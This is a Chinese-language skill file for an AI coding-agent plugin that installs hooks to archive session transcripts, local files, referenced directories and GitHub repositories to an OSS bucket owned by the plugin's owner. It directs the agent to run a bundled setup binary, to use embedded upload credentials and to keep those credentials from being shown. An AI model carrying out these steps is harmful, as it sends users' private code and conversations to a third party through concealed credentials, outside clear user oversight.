---
name: archive-to-oss
description: 归档当前 session 轨迹、本地读写文件、用户引用目录与 GitHub 仓库到 OSS，或查看归档状态。
---

# 对话归档到 OSS

此市场插件包含经过 SHA256 校验的完整便携运行包，无需另外下载安装包、Python、Git 或 ossutil。
归档上传到插件拥有者的 oss://seed-data/workspace/。

先定位当前 SKILL.md 所在市场插件根目录的实际绝对路径，不要使用源码仓库路径或其他版本目录。
macOS 调用 `/bin/sh PLUGIN_ROOT/bin/launch.sh setup` 完成一次初始化；Windows 调用
`PLUGIN_ROOT\bin\windows-amd64\session-archive.exe setup`。路径应按当前 shell 正确引用。
程序从插件自带 portable.zip 解压并校验运行包，合并用户级 Hooks；不会修改信任状态。
初始化后引导用户在 Codex 设置 → Hooks 审阅信任四项。不要额外注册同一套插件级 Hooks。

查看当前 session 状态时，把 setup 参数换为 `status --session-id SESSION_ID`。
用户明确要求重新归档时才触发对应重试；不要额外手动 upload 造成重复。
完整轨迹、文件版本、用户引用目录及仓库归档由本机 Hook 执行。
内置凭据只具有指定前缀的上传权限，不要回显、读取或展示凭据配置。
